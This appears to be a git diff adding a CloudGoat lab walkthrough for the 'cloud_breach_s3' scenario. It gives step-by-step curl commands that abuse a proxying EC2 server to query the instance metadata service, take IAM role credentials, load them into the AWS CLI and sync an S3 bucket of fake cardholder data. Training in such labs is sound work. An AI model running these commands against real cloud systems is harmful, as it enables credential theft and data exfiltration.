@@ -177,8 +177,55 @@ Now that the new instance contains full admin access the targe instance can be t
 10. Remove the aws cli credentials for Kerrigan 
 
 ## cloud_breach_s3
+**Scenario Goal: Download the confidential files from the S3 bucket**
 1. Create scenario  
 `./cloudgoat.py create cloud_breach_s3 --profile goat`  
+2. Document the Output information, which only include an account id and an ec2 server address   
+3. Submit a curl request to the ec2 IP   
+`curl -sv http://<ec2IP>`
+This contains an H1 header stating the server is configured to proxy requests to the EC2 metadata service. It even contains instruction requred to successfully submit a request.  
+The IP 169.254.169.254 is a link-local address used for retrieving metadata. It is meant to be used from an instance to retrieve metadata for that instance. Let's use that as our modified header and see what happens.
+4. Submit a metadata curl request
+`curl -sv http://<ec2IP>/latest/meta-data/ -H 'Host:169.254.169.254`
+This requests reveals a directory structure, iam is an interesting place to start.
+5. Submit an iam metadata curl request
+`curl -sv http://<ec2IP>/latest/meta-data/iam/ -H 'Host:169.254.169.254`
+This results one file called info and a directory called security-credentials
+6. Submit and iam info metadata curl request
+`curl -sv http://<ec2IP>/latest/meta-data/iam/info -H 'Host:169.254.169.254`
+7. Document the results for later and explore the security-credentials folder
+`curl -sv http://<ec2IP>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254`
+8. Continue Enumeration with the WAF Role and copy the secrets it results in
+`curl -sv http://<ec2IP>/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidx -H 'Host:169.254.169.254`
+9. Now that we have credentials we can create a role profile   
+`aws configure --profile Wrole`    
+    * AWS Access Key ID: __WAF Role aws_access_key_id__   
+    * AWS Secret Access Key: __WAF Role aws_secret_access_key__   
+    * Default region name: __us-east-1__   
+    * Default output format: __leave blank__ 
+10. Edit the AWS Credentials file to add the session token  
+`vim ~/.aws/credentials`  
+`:set paste` Enter  
+`i` navigate to the end of the last line then add the session token  
+`aws_session_token = <token>`ESC  
+`:wq` Enter   
+Let's see what these credentials can do  
+11. Attempt to list s3 buckets
+`aws s3 ls --profile wrole`  
+Success! 
+13. Copy the discovered bucket name into a local folder, we'll name it cardholder after the bucket name
+`aws s3 cp s3://<bucket> ./cardholder --profile wrole`
+That didn't work, maybe we can sync?
+14. Sync the bucket with a local folder
+`aws s3 sync s3://<bucket> ./cardholder --profile wrole`
+**Goal Achieved**
+15. Review the new folder for creepy fake PII information
+```bash
+ls -la cardholder
+cat cardholder/cardholder_data_primary.csv
+cat cardholder/cardholder_data_secondary.csv
+cat cardholder/card
+```
 
 
 ### Remove cloud_breach_s3
